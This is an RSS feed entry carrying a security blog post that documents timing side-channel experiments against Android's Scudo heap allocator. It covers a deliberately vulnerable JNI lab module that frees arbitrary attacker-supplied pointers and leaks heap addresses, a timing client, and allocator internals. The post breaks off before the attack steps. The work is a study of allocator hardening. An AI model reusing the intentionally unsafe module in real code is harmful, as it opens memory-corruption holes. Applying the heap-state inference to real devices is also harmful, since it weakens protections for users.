<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>JNI on lolcads tech blog</title><link>https://lolcads.github.io/tags/jni/</link><description>Recent content in JNI on lolcads tech blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&amp;copy; lolcads</copyright><lastBuildDate>Fri, 26 Jul 2024 16:46:21 +0100</lastBuildDate><atom:link href="https://lolcads.github.io/tags/jni/index.xml" rel="self" type="application/rss+xml"/><item><title>Timing Attack Experiments against Scudo (Part 2)</title><link>https://lolcads.github.io/posts/2024/07/scudo_1/</link><pubDate>Fri, 26 Jul 2024 16:46:21 +0100</pubDate><guid>https://lolcads.github.io/posts/2024/07/scudo_1/</guid><description>Attempting Timing Attacks against Scudo In this second blog post we will take a different approach for attacking Scudo, i.e. we will try to the measure execution times for calls to malloc and hope to be able to derive a portion of the internal state of the allocator (i.e. perform side channel attacks). The version of Scudo considered in this blog post is 161cca266a9d0b6deb5f1fd2de8ad543649a7fa1.
There will be almost only negative results (which means I unfortunately could not make it work), except for one.</description><content>&lt;h1 id="attempting-timing-attacks-against-scudo">Attempting Timing Attacks against &lt;em>Scudo&lt;/em>&lt;/h1>
&lt;p>In this second blog post we will take a different approach for attacking &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/;bpv=0;bpt=0">&lt;em>Scudo&lt;/em>&lt;/a>, i.e. we will try to the measure execution times for calls to &lt;code>malloc&lt;/code> and hope to be able to derive a portion of the internal state of the allocator (i.e. perform side channel attacks). The version of Scudo considered in this blog post is &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/METADATA;l=19;drc=45e1036faa0dcfa30a01982880be1137d441333d">&lt;code>161cca266a9d0b6deb5f1fd2de8ad543649a7fa1&lt;/code>&lt;/a>.&lt;/p>
&lt;p>There will be almost only negative results (which means I unfortunately could not make it work), except for one. The main conclusion we can draw from this post is that &lt;em>Scudo&lt;/em> is &lt;strong>not&lt;/strong> designed to mitigate timing attacks! This follows from trying to leak a piece of information and then accidentally leaking a different and unclassified piece.&lt;/p>
&lt;p>&lt;strong>Disclaimer&lt;/strong>: The following analyses can be incomplete and/or incorrect. Also the experiments conducted are on a &lt;strong>very&lt;/strong> basic level compared to the complex field of &lt;em>Data Science&lt;/em>. The style of this post is informal and chosen based on the idea of practical attacks on Android.&lt;/p>
&lt;h2 id="experimental-setup">Experimental Setup&lt;/h2>
&lt;p>As usual, there is a module for the &lt;em>damnvulnerableapp&lt;/em> of the form:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">JNIEXPORT jbyteArray JNICALL
&lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_HeapSCAModule_handleMessage&lt;/span>(JNIEnv &lt;span style="color:#f92672">*&lt;/span>env,
jclass class,
jbyteArray message) {
&lt;span style="color:#66d9ef">uint32_t&lt;/span> length &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength(env, message);
&lt;span style="color:#66d9ef">if&lt;/span> (length &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> NULL;
jbyte &lt;span style="color:#f92672">*&lt;/span>raw &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements(env, message, NULL);
&lt;span style="color:#66d9ef">if&lt;/span> (raw) {
jbyteArray result &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray(env, &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;span style="color:#66d9ef">switch&lt;/span> (raw[&lt;span style="color:#ae81ff">0&lt;/span>]) {
&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> {
&lt;span style="color:#75715e">// Malloc
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">uint64_t&lt;/span> size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((&lt;span style="color:#66d9ef">uint64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>raw[&lt;span style="color:#ae81ff">1&lt;/span>]);
&lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr;
ptr &lt;span style="color:#f92672">=&lt;/span> malloc(size);
(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion(env, result, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, (jbyte&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>ptr);
&lt;span style="color:#66d9ef">break&lt;/span>;
}
&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> {
&lt;span style="color:#75715e">// Free
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">uint8_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">uint64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>raw[&lt;span style="color:#ae81ff">1&lt;/span>]);
free(ptr);
(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion(env, result, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, (jbyte&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>ptr);
&lt;span style="color:#66d9ef">break&lt;/span>;
}
}
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
&lt;span style="color:#66d9ef">return&lt;/span> NULL;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This module lets the user directly control whether and how to call &lt;code>malloc&lt;/code> and &lt;code>free&lt;/code>, or, to be more precise, &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=292;bpv=0;bpt=0">&lt;code>Allocator::allocate&lt;/code>&lt;/a> and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=507;bpv=0;bpt=0">&lt;code>Allocator::deallocate&lt;/code>&lt;/a>. The input is composed like this: &lt;code>&amp;lt;func id&amp;gt;&amp;lt;size | ptr&amp;gt;&lt;/code> (9 bytes).&lt;/p>
&lt;p>&lt;em>damnvulnerableapp&lt;/em> is run in an &lt;em>x86-64&lt;/em> emulator (Pixel 3) running Android 12 and forwards &lt;em>remote&lt;/em> user requests to the above module. It is already expected to see a lot of timing noise based on this setup.&lt;/p>
&lt;p>Notice that measuring execution time of a remote call to e.g. &lt;code>malloc(0x10)&lt;/code> (primary allocation) will actually measure execution time of a call to &lt;code>Java_com_damnvulnerableapp_vulnerable_modules_HeapSCAModule_handleMessage&lt;/code>, which is called from Java.&lt;/p>
&lt;p>As regards the client used to communicate with the app, it is written in &lt;em>C&lt;/em>, thus it is expected to run faster than the former &lt;em>Python&lt;/em> client. Because &lt;em>damnvulnerableapp&lt;/em> uses a request - response model, i.e. a client has to request e.g. &lt;code>malloc(0x10)&lt;/code>, gets a response that the request &amp;ldquo;worked&amp;rdquo; and then has to fetch the result with a second request, the time measurements are conducted as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">struct&lt;/span> timespec before;
&lt;span style="color:#66d9ef">struct&lt;/span> timespec after;
...
&lt;span style="color:#75715e">// Request malloc(0x10)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>app_forward(fd, (&lt;span style="color:#66d9ef">uint8_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)message, &lt;span style="color:#ae81ff">9&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer_length, &lt;span style="color:#f92672">&amp;amp;&lt;/span>before);
&lt;span style="color:#75715e">// Free response buffer
&lt;/span>&lt;span style="color:#75715e">&lt;/span>free(buffer);
&lt;span style="color:#75715e">// Request result of malloc(0x10)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>app_fetch(fd, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer_length, &lt;span style="color:#f92672">&amp;amp;&lt;/span>after);
&lt;span style="color:#75715e">// Extract result from response
&lt;/span>&lt;span style="color:#75715e">&lt;/span>pointer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">uint64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)get_content(buffer, buffer_length);
&lt;span style="color:#75715e">// Free response buffer
&lt;/span>&lt;span style="color:#75715e">&lt;/span>free(buffer);
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>app_fetch&lt;/code> and &lt;code>app_forward&lt;/code> (internally call &lt;code>app_send_formatted&lt;/code>) are the core of this client:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">enum&lt;/span> error_code &lt;span style="color:#a6e22e">app_fetch&lt;/span>(...)
{
...
result &lt;span style="color:#f92672">=&lt;/span> app_send_formatted(fd, &lt;span style="color:#e6db74">&amp;#34;CONTENT&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;FETCH&amp;#34;&lt;/span>, (&lt;span style="color:#66d9ef">uint8_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, NULL);
&lt;span style="color:#66d9ef">if&lt;/span> (result &lt;span style="color:#f92672">!=&lt;/span> error_success) {
log_error(&lt;span style="color:#e6db74">&amp;#34;Failed to forward buffer&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
result &lt;span style="color:#f92672">=&lt;/span> app_full_read(fd, buffer, buffer_size);
&lt;span style="color:#66d9ef">if&lt;/span> (result &lt;span style="color:#f92672">!=&lt;/span> error_success) {
log_error(&lt;span style="color:#e6db74">&amp;#34;Failed to read response to forward&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
&lt;span style="color:#75715e">// Measure time after fetching result
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (after_receive &lt;span style="color:#f92672">!=&lt;/span> NULL)
clock_gettime(CLOCK_THREAD_CPUTIME_ID, after_receive);
...
}
&lt;span style="color:#66d9ef">enum&lt;/span> error_code &lt;span style="color:#a6e22e">app_send_formatted&lt;/span>(...)
{
...
&lt;span style="color:#75715e">// Measure time before forwarding message
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (before_send &lt;span style="color:#f92672">!=&lt;/span> NULL)
clock_gettime(CLOCK_THREAD_CPUTIME_ID, before_send);
result &lt;span style="color:#f92672">=&lt;/span> app_full_write(fd, buffer, buffer_size &lt;span style="color:#f92672">+&lt;/span> content_length);
free(buffer);
&lt;span style="color:#66d9ef">if&lt;/span> (result &lt;span style="color:#f92672">!=&lt;/span> error_success) {
log_error(&lt;span style="color:#e6db74">&amp;#34;Failed to send request&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Because of the request - response model, there is additional noise introduced by being forced to make two remote requests for one e.g. &lt;code>malloc(0x10)&lt;/code>!&lt;/p>
&lt;p>Lets again summarize expected sources of noise introduced by the experimental setup:&lt;/p>
&lt;ol>
&lt;li>Android OS is emulated and therefore does not behave like an Android OS running on a &amp;ldquo;real&amp;rdquo; device (e.g. in terms of CPU power and scheduling)&lt;/li>
&lt;li>Remote access to &lt;em>damnvulnerableapp&lt;/em>. Although the emulator that runs the app is launched within the same device we will perform the measurements with, this is an additional layer of indirection.&lt;/li>
&lt;li>Call to e.g. &lt;code>malloc&lt;/code> is actually a call to &lt;code>handleMessage&lt;/code>, which has to be invoked from Java. The call stack is pretty deep&amp;hellip;&lt;/li>
&lt;li>Two requests per operation&lt;/li>
&lt;/ol>
&lt;h2 id="timing-attacks">Timing Attacks&lt;/h2>
&lt;p>In this section, timing attacks on different targets within &lt;em>Scudo&lt;/em> will be discussed.&lt;/p>
&lt;h3 id="attacking-chunks-array">Attacking Chunks Array&lt;/h3>
&lt;p>The core idea is to abuse a timing side channel on &lt;code>Allocator::allocate&lt;/code>, i.e. calling &lt;code>malloc&lt;/code> in &lt;em>damnvulnerableapp&lt;/em>. &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=69;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>C-&amp;gt;Count&lt;/code>&lt;/a> will be the target of the attack, i.e. based on the measured execution times, we try to estimate the value of &lt;code>C-&amp;gt;Count&lt;/code>.&lt;/p>
&lt;p>One may ask, why &lt;code>C-&amp;gt;Count&lt;/code> is interesting. There are two reasons:&lt;/p>
&lt;ol>
&lt;li>The chunk arrays are shuffled to, among other things, prevent an attacker from predicting where the next allocated chunk will be located. E.g. this can prevent heap overflows. Knowing &lt;code>C-&amp;gt;Count&lt;/code> looks like the first natural step to predicting how the array looks like in terms of address ordering.&lt;/li>
&lt;li>&lt;code>SizeClassAllocatorLocalCache::allocate&lt;/code> contains a classical pattern for a timing side channel:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">allocate&lt;/span>(uptr ClassId) {
...
PerClass &lt;span style="color:#f92672">*&lt;/span>C &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PerClassArray[ClassId];
&lt;span style="color:#66d9ef">if&lt;/span> (C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) { &lt;span style="color:#75715e">// If C-&amp;gt;Count = 0, then execution time is longer than &amp;#34;usual&amp;#34;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> ...
refill(C, ClassId);
...
}
&lt;span style="color:#75715e">// The rest is very fast
&lt;/span>&lt;span style="color:#75715e">&lt;/span> ...
CompactPtrT CompactP &lt;span style="color:#f92672">=&lt;/span> C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Chunks[&lt;span style="color:#f92672">--&lt;/span>C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count];
...
&lt;span style="color:#66d9ef">return&lt;/span> Allocator&lt;span style="color:#f92672">-&amp;gt;&lt;/span>decompactPtr(ClassId, CompactP);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>When allocating memory from the primary allocator via e.g. &lt;code>malloc(0x10)&lt;/code>, then there is a number of allocations that will result in triggering &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=69;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count == 0&lt;/code>&lt;/a>, which again triggers execution of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=169;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>refill&lt;/code>&lt;/a>. Afterwards, assuming that batches are only pushed back through &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>drain&lt;/code>&lt;/a> or are newly allocated via &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=361;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>map&lt;/code>&lt;/a>, we can distinguish the following cases for &lt;code>C-&amp;gt;Count&lt;/code>:&lt;/p>
&lt;ol>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=183;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count = C-&amp;gt;MaxCount / 2&lt;/code>&lt;/a>. This stems from the fact that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=84;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>deallocate&lt;/code>&lt;/a> can create batches if the corresponding &lt;code>Chunks&lt;/code> array is full. To be precise, this will trigger the execution of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>drain&lt;/code>&lt;/a>, where &lt;code>C-&amp;gt;Count = C-&amp;gt;MaxCount&lt;/code>. Therefore the minimum &lt;code>Count = Min(C-&amp;gt;MaxCount / 2, C-&amp;gt;Count)&lt;/code> in &lt;code>drain&lt;/code> will evaluate to &lt;code>0 &amp;lt; C-&amp;gt;MaxCount / 2 &amp;lt; C-&amp;gt;MaxCount&lt;/code>. Finally, &lt;code>C-&amp;gt;Count -= Count &amp;lt;=&amp;gt; C-&amp;gt;Count = C-&amp;gt;MaxCount - C-&amp;gt;MaxCount / 2 = C-&amp;gt;MaxCount / 2&lt;/code>. Notice that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=153;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">&lt;code>C-&amp;gt;MaxCount = 2 * TransferBatch::getMaxCached(Size)&lt;/code>&lt;/a>. As can be seen in the next step, for &lt;code>malloc(0x10)&lt;/code>, this will result in &lt;code>C-&amp;gt;MaxCount = 2 * 13 = 26 =&amp;gt; C-&amp;gt;Count = 26 / 2 = 13&lt;/code>.&lt;/li>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=396;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count = MaxCount&lt;/code>&lt;/a>, i.e.:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count &lt;span style="color:#f92672">=&lt;/span> MaxCount
&lt;span style="color:#f92672">=&lt;/span> TransferBatch&lt;span style="color:#f92672">::&lt;/span>getMaxCached(Size)
&lt;span style="color:#f92672">=&lt;/span> Min(MaxNumCached, SizeClassMap&lt;span style="color:#f92672">::&lt;/span>getMaxCachedHint(Size))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(Config&lt;span style="color:#f92672">::&lt;/span>MaxNumCachedHint, N)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, (&lt;span style="color:#ae81ff">1U&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> Config&lt;span style="color:#f92672">::&lt;/span>MaxBytesCachedLog) &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#66d9ef">static_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>u32&lt;span style="color:#f92672">&amp;gt;&lt;/span>(Size))))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, (&lt;span style="color:#ae81ff">1U&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>) &lt;span style="color:#f92672">/&lt;/span> Classes[ClassId &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>])))
&lt;/code>&lt;/pre>&lt;/div>&lt;p>where &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/size_class_map.h;l=269;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Classes&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">constexpr&lt;/span> u32 Classes[] &lt;span style="color:#f92672">=&lt;/span> {
&lt;span style="color:#ae81ff">0x00020&lt;/span>, &lt;span style="color:#ae81ff">0x00030&lt;/span>, &lt;span style="color:#ae81ff">0x00040&lt;/span>, &lt;span style="color:#ae81ff">0x00050&lt;/span>, &lt;span style="color:#ae81ff">0x00060&lt;/span>, &lt;span style="color:#ae81ff">0x00070&lt;/span>, &lt;span style="color:#ae81ff">0x00080&lt;/span>, &lt;span style="color:#ae81ff">0x00090&lt;/span>,
&lt;span style="color:#ae81ff">0x000a0&lt;/span>, &lt;span style="color:#ae81ff">0x000b0&lt;/span>, &lt;span style="color:#ae81ff">0x000c0&lt;/span>, &lt;span style="color:#ae81ff">0x000e0&lt;/span>, &lt;span style="color:#ae81ff">0x000f0&lt;/span>, &lt;span style="color:#ae81ff">0x00110&lt;/span>, &lt;span style="color:#ae81ff">0x00120&lt;/span>, &lt;span style="color:#ae81ff">0x00130&lt;/span>,
&lt;span style="color:#ae81ff">0x00150&lt;/span>, &lt;span style="color:#ae81ff">0x00160&lt;/span>, &lt;span style="color:#ae81ff">0x00170&lt;/span>, &lt;span style="color:#ae81ff">0x00190&lt;/span>, &lt;span style="color:#ae81ff">0x001d0&lt;/span>, &lt;span style="color:#ae81ff">0x00210&lt;/span>, &lt;span style="color:#ae81ff">0x00240&lt;/span>, &lt;span style="color:#ae81ff">0x002a0&lt;/span>,
&lt;span style="color:#ae81ff">0x00330&lt;/span>, &lt;span style="color:#ae81ff">0x00370&lt;/span>, &lt;span style="color:#ae81ff">0x003a0&lt;/span>, &lt;span style="color:#ae81ff">0x00400&lt;/span>, &lt;span style="color:#ae81ff">0x00430&lt;/span>, &lt;span style="color:#ae81ff">0x004a0&lt;/span>, &lt;span style="color:#ae81ff">0x00530&lt;/span>, &lt;span style="color:#ae81ff">0x00610&lt;/span>,
&lt;span style="color:#ae81ff">0x00730&lt;/span>, &lt;span style="color:#ae81ff">0x00840&lt;/span>, &lt;span style="color:#ae81ff">0x00910&lt;/span>, &lt;span style="color:#ae81ff">0x009c0&lt;/span>, &lt;span style="color:#ae81ff">0x00a60&lt;/span>, &lt;span style="color:#ae81ff">0x00b10&lt;/span>, &lt;span style="color:#ae81ff">0x00ca0&lt;/span>, &lt;span style="color:#ae81ff">0x00e00&lt;/span>,
&lt;span style="color:#ae81ff">0x00fb0&lt;/span>, &lt;span style="color:#ae81ff">0x01030&lt;/span>, &lt;span style="color:#ae81ff">0x01130&lt;/span>, &lt;span style="color:#ae81ff">0x011f0&lt;/span>, &lt;span style="color:#ae81ff">0x01490&lt;/span>, &lt;span style="color:#ae81ff">0x01650&lt;/span>, &lt;span style="color:#ae81ff">0x01930&lt;/span>, &lt;span style="color:#ae81ff">0x02010&lt;/span>,
&lt;span style="color:#ae81ff">0x02190&lt;/span>, &lt;span style="color:#ae81ff">0x02490&lt;/span>, &lt;span style="color:#ae81ff">0x02850&lt;/span>, &lt;span style="color:#ae81ff">0x02d50&lt;/span>, &lt;span style="color:#ae81ff">0x03010&lt;/span>, &lt;span style="color:#ae81ff">0x03210&lt;/span>, &lt;span style="color:#ae81ff">0x03c90&lt;/span>, &lt;span style="color:#ae81ff">0x04090&lt;/span>,
&lt;span style="color:#ae81ff">0x04510&lt;/span>, &lt;span style="color:#ae81ff">0x04810&lt;/span>, &lt;span style="color:#ae81ff">0x05c10&lt;/span>, &lt;span style="color:#ae81ff">0x06f10&lt;/span>, &lt;span style="color:#ae81ff">0x07310&lt;/span>, &lt;span style="color:#ae81ff">0x08010&lt;/span>, &lt;span style="color:#ae81ff">0x0c010&lt;/span>, &lt;span style="color:#ae81ff">0x10010&lt;/span>,
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So for a small allocation, i.e. for &lt;code>ClassId = 1&lt;/code>, we get:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count &lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, &lt;span style="color:#ae81ff">0x2000&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, &lt;span style="color:#ae81ff">256&lt;/span>)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, &lt;span style="color:#ae81ff">13&lt;/span>))
&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice that &lt;code>C-&amp;gt;Count = MaxCount&lt;/code> is true for all batches added to &lt;code>FreeList&lt;/code> except for the last one, because &lt;code>N&lt;/code> depends on a minimum:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">for&lt;/span> (u32 I &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; I &lt;span style="color:#f92672">&amp;lt;&lt;/span> NumberOfBlocks;) {
TransferBatch &lt;span style="color:#f92672">*&lt;/span>B &lt;span style="color:#f92672">=&lt;/span>
C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>createBatch(ClassId, &lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&amp;gt;&lt;/span>(decompactPtrInternal(
CompactPtrBase, ShuffleArray[I])));
&lt;span style="color:#66d9ef">if&lt;/span> (UNLIKELY(&lt;span style="color:#f92672">!&lt;/span>B))
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">nullptr&lt;/span>;
&lt;span style="color:#66d9ef">const&lt;/span> u32 N &lt;span style="color:#f92672">=&lt;/span> Min(MaxCount, NumberOfBlocks &lt;span style="color:#f92672">-&lt;/span> I); &lt;span style="color:#75715e">// If (NumberOfBlocks - I &amp;lt; MaxCount) =&amp;gt; last iteration
&lt;/span>&lt;span style="color:#75715e">&lt;/span> B&lt;span style="color:#f92672">-&amp;gt;&lt;/span>setFromArray(&lt;span style="color:#f92672">&amp;amp;&lt;/span>ShuffleArray[I], N);
Region&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FreeList.push_back(B);
I &lt;span style="color:#f92672">+=&lt;/span> N;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="single---threaded-timing---based-side-channel-attack-on-primary">Single - Threaded Timing - Based Side Channel Attack on Primary&lt;/h4>
&lt;p>Assuming that the only thread that accesses the &lt;em>Scudo&lt;/em> primary for allocations of the form &lt;code>malloc(0x10)&lt;/code> can be convinced to run this allocation with a constant, computable overhead. Then, the following attack might enable the prediction of &lt;code>C-&amp;gt;Count&lt;/code> based on measures of elapsed time:&lt;/p>
&lt;ol>
